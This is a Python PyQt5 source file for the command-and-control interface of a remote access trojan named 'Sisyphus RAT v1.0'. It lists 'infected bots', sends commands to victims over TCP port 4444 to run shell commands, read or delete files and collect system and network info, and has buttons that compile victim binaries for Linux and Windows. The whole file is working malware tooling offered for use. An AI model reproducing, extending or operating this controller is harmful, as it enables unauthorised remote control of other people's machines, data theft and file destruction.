## regular imports

import sys, os, socket, qdarkstyle

## PyQt5 imports

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5 import QtCore
from PyQt5 import QtGui
from PyQt5.QtGui import *

class ConnectionHandler:
    def __init__(self, port, ID):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ID
        self.port = port
        self.ID = ID

        self.s.connect((self.host, self.port))

    def sendData(self, feature):
        self.s.send(bytes(feature, encoding="utf8"))
        self.results = self.s.recv(1024)
        return self.results.decode("utf8")

class WindowManager(QWidget):
    def __init__(self):
        super().__init__()

        ## Window information
        self.title = "Sisyphus RAT v1.0"
        self.width = 600
        self.height = 1000

        ## set target information
        self.enterConnection = QLabel()
        self.newConnection = QLineEdit()
        self.targetInput = QLineEdit()

        ## run features and display output
        self.promptLabel = QLabel()
        self.command_prompt = QLineEdit()
        self.console = QTextEdit(self)
        self.execute = QPushButton("Execute")
        self.execute.clicked.connect(self.executeCommand)

        ## compile binary for linux or windows
        self.compileLabel = QLabel()
        self.compileLinux = QPushButton("Compile for Linux")
        self.compileWindows = QPushButton("Compile for Windows")
        self.compileLinux.clicked.connect(self.compileForLinux)
        self.compileWindows.clicked.connect(self.compileForWindows)

        ## add new connection button
        self.newConnectionButton = QPushButton("Add Connection")
        self.newConnectionButton.clicked.connect(self.addConnection)

        ## labels for features and usage
        self.featureExamples = QLabel()
        self.botsDescription = QLabel()

        self.botsCounter = 0

        self.initUi()

    def initUi(self):
        self.setWindowTitle(self.title)
        self.setGeometry(10, 10, self.width, self.height)

        ## set label text contents
        self.enterConnection.setText("Enter a new connection")
        self.targetInput.setPlaceholderText("Target IP Address...")
        self.newConnection.setPlaceholderText("IP of new connection...")
        self.botsDescription.setText("All Infected Bots\n")
        self.botsDescription.setFont(QFont('Arial', 16))
        self.featureExamples.setText("Features and Examples\n")
        self.featureExamples.setFont(QFont('Arial', 16))
        self.promptLabel.setText("Feature and Aruguments...")
        self.compileLabel.setText("Compile victim binary for either windows or linux, output to pwd")

        ## bots table
        self.botsTable = QTableWidget()
        self.botsTable.setColumnCount(2)
        self.botsTable.setRowCount(100)
        self.description = ["IP Address", "STATUS"]
        self.botsTable.setHorizontalHeaderLabels(self.description)

        ## features table
        self.featureTable = QTableWidget()
        self.featureTable.setRowCount(5)
        self.featureTable.setColumnCount(2)
        self.features = ["COMMAND", "EXAMPLE"]
        self.featureTable.setHorizontalHeaderLabels(self.features)
        self.featureTable.setItem(0, 0, QTableWidgetItem("Run a command on the victim"))
        self.featureTable.setItem(0, 1, QTableWidgetItem("execute(ls)"))
        self.featureTable.setItem(1, 0, QTableWidgetItem("Delete a file in the victim"))
        self.featureTable.setItem(1, 1, QTableWidgetItem("delete(/root/file.txt"))
        self.featureTable.setItem(2, 0, QTableWidgetItem("Display victim system info"))
        self.featureTable.setItem(2, 1, QTableWidgetItem("system_info()"))
        self.featureTable.setItem(3, 0, QTableWidgetItem("Display victim networking info"))
        self.featureTable.setItem(3, 1, QTableWidgetItem("networking_info()"))
        self.featureTable.setItem(4, 0, QTableWidgetItem("Read a file on the victim"))
        self.featureTable.setItem(4, 1, QTableWidgetItem("read(/root/file.txt)"))
        self.featureTable.resizeColumnsToContents()
        self.featureTable.resizeRowsToContents()

        ## user enters command and argument
        self.command_prompt.setMaxLength(100)
        self.command_prompt.setPlaceholderText("feature(argument) 127.0.0.1")

        self.newConnection.setMaxLength(30)

        ## output console dimensions
        self.console.setMaximumHeight(200)
        self.console.setMaximumWidth(700)
        
        self.command_prompt.setMaximumWidth(500)

        ## add all the widgets
        layout = QGridLayout()
        layout.addWidget(self.enterConnection)
        layout.addWidget(self.newConnection)
        layout.addWidget(self.newConnectionButton)
        layout.addWidget(self.botsDescription)
        layout.addWidget(self.botsTable)
        layout.addWidget(self.featureExamples)
        layout.addWidget(self.featureTable)
        layout.addWidget(self.command_prompt)
        layout.addWidget(self.console)
        layout.addWidget(self.execute)
        layout.addWidget(self.compileLabel)
        layout.addWidget(self.compileLinux)
        layout.addWidget(self.compileWindows)

        layout.setAlignment(Qt.AlignLeft)
        layout.setSpacing(5)

        ## list of all connections
        self.activeConnections = {}
        self.connectionID  = 0

        self.setLayout(layout)
        self.show()
        
    def executeCommand(self):
        ID = self.command_prompt.text().split(" ")[1]
        feature = self.command_prompt.text().split(" ")[0]

        if not ID in self.activeConnections:
            new = ConnectionHandler(4444, ID)
            self.activeConnections[ID] = new

        currentConnection = self.activeConnections[ID]
        results = currentConnection.sendData(feature)

        self.console.setText(results)

    def addConnection(self):
        self.botsTable.setItem(self.botsCounter, 0, QTableWidgetItem(str(self.newConnection.text())))
        self.botsCounter += 1

    def compileForLinux(self):
        self.console.setText("Check PWD for file linux, run on victim")
        os.system("gcc main.c linux.c -o linux")

    def compileForWindows(self):
        self.console.setText("Check PWD for file windows, run on victim")
        os.system("i686-w64-mingw32-gcc main.c windows.c -o windows.exe -lwsock32")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())
    ex = WindowManager()
    sys.exit(app.exec_())
